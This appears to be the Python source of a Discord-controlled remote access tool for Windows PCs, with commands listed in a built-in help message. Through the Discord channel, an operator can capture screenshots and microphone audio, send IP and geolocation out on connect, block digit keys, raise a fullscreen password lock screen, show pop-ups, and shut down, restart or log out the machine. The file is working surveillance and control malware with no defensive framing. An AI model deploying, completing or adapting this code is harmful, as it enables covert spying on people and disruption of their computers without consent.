import discord
from discord.ext import commands
from pynput.keyboard import Listener, Controller
import tkinter as tk
from threading import Thread
import platform
import psutil
import socket
import subprocess
import requests
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
import ctypes
import time
import os

TOKEN = '0'
CHANNEL_ID = 0
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

keyboard_controller = Controller()
disable_numbers = False

def show_popup_message(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Example", 1)

@bot.command(name="msg")
async def popup_message(ctx, *, message: str):
    try:
        await ctx.send(f"Displaying message on PC: {message}")
        show_popup_message(message)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

def on_press(key):
    global disable_numbers
    if disable_numbers:
        try:
            if key.char and key.char.isdigit():
                return False
        except AttributeError:
            pass

def start_keyboard_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

Thread(target=start_keyboard_listener, daemon=True).start()

@bot.command(name="keyboard")
async def disable_keyboard(ctx):
    global disable_numbers
    if not disable_numbers:
        disable_numbers = True
        await ctx.send("Keyboard numbers are now disabled.")
    else:
        disable_numbers = False
        await ctx.send("Keyboard numbers are now enabled.")

@bot.command(name="ui")
async def show_ui(ctx):
    def typing_effect(text_widget, text, delay=0.1):
        for char in text:
            text_widget.insert("end", char)
            text_widget.update()
            time.sleep(delay)

    def on_password_submit():
        if password_entry.get() == "12345":
            root.destroy()

    await ctx.send("Displaying UI lock screen...")

    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg="black")

    message_label = tk.Label(root, text="Example", fg="white", bg="black", font=("Helvetica", 24))
    message_label.pack(pady=100)

    typing_label = tk.Text(root, fg="white", bg="black", font=("Helvetica", 16), height=2, borderwidth=0)
    typing_label.pack()

    typing_effect(typing_label, "You need to enter a password to unlock: ")

    password_entry = tk.Entry(root, show="*", font=("Helvetica", 16), justify="center")
    password_entry.pack(pady=10)

    submit_button = tk.Button(root, text="Submit", command=on_password_submit, font=("Helvetica", 14))
    submit_button.pack(pady=20)

    root.mainloop()

@bot.event
async def on_ready():
    pc_name = socket.gethostname()
    local_ip = socket.gethostbyname(pc_name)
    try:
        ip_data = requests.get("http://ip-api.com/json").json()
        public_ip = ip_data.get("query", "N/A")
        country = ip_data.get("country", "N/A")
        city = ip_data.get("city", "N/A")
    except:
        public_ip = "Unavailable"
        country = "Unavailable"
        city = "Unavailable"

    connected_message = (
        f"**Bot Connected to PC:**\n"
        f"PC Name: {pc_name}\n"
        f"Local IP: {local_ip}\n"
        f"Public IP: {public_ip}\n"
        f"Location: {city}, {country}"
    )
    print(connected_message)
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(connected_message)

@bot.command(name="sysinfo")
async def system_info(ctx):
    try:
        pc_name = socket.gethostname()
        local_ip = socket.gethostbyname(pc_name)
        try:
            ip_data = requests.get("http://ip-api.com/json").json()
            public_ip = ip_data.get("query", "N/A")
            country = ip_data.get("country", "N/A")
            city = ip_data.get("city", "N/A")
        except:
            public_ip = "Unavailable"
            country = "Unavailable"
            city = "Unavailable"

        uname = platform.uname()
        os_info = f"Operating System: {uname.system} {uname.release} (Version: {uname.version})"
        cpu_info = f"Processor: {uname.processor}"
        memory = psutil.virtual_memory()
        memory_info = f"Memory: {memory.total // (1024 ** 3)} GB (Available: {memory.available // (1024 ** 3)} GB)"

        sysinfo_message = (
            f"**System Information for {pc_name}:**\n"
            f"Local IP: {local_ip}\n"
            f"Public IP: {public_ip}\n"
            f"Location: {city}, {country}\n\n"
            f"{os_info}\n"
            f"{cpu_info}\n"
            f"{memory_info}"
        )
        await ctx.send(sysinfo_message)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name="screenshot")
async def take_screenshot(ctx):
    try:
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        await ctx.send("Here is the screenshot:", file=discord.File(screenshot_path))
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"An error occurred while taking the screenshot: {e}")

@bot.command(name="startaudio")
async def start_audio(ctx):
    try:
        channels = 1
        duration = 10
        samplerate = 44100

        await ctx.send("Starting audio recording...")
        audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
        sd.wait()

        audio_path = "recorded_audio.wav"
        write(audio_path, samplerate, audio)
        await ctx.send("Here is the recorded audio:", file=discord.File(audio_path))
        os.remove(audio_path)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name="shutdown")
async def shutdown(ctx):
    await ctx.send("Shutting down the PC...")
    os.system("shutdown /s /t 1")

@bot.command(name="restart")
async def restart(ctx):
    await ctx.send("Restarting the PC...")
    os.system("shutdown /r /t 1")

@bot.command(name="logout")
async def logout(ctx):
    await ctx.send("Logging out the user...")
    os.system("shutdown /l")

@bot.command(name="lock")
async def lock_screen(ctx):
    await ctx.send("Locking the PC screen...")
    os.system("rundll32.exe user32.dll,LockWorkStation")

@bot.command(name="commands")
async def custom_help(ctx):
    help_message = """
**Available Commands:**
- `!msg <your_message>`: Displays a pop-up message on the PC.
- `!keyboard`: Toggles disabling the keyboard (numbers only).
- `!ui`: Displays a fullscreen UI with a password prompt.
- `!sysinfo`: Displays system information, including IP and location.
- `!screenshot`: Takes a screenshot of the screen.
- `!startaudio`: Records 10 seconds of audio.
- `!shutdown`: Shuts down the PC.
- `!restart`: Restarts the PC.
- `!logout`: Logs out the current user.
- `!lock`: Locks the screen.
"""
    await ctx.send(help_message)

bot.run(TOKEN)
